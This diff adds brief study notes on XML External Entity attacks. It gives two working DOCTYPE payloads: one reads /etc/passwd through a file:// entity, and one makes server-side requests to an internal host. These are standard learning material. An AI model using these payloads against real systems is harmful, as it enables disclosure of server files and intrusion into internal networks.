@@ -1,0 +1,10 @@
+Exploiting XXE to retrieve files:
+
+replace data with &xxe;
+
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+
+Exploiting XXE to perform SSRF attacks:
+
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
+
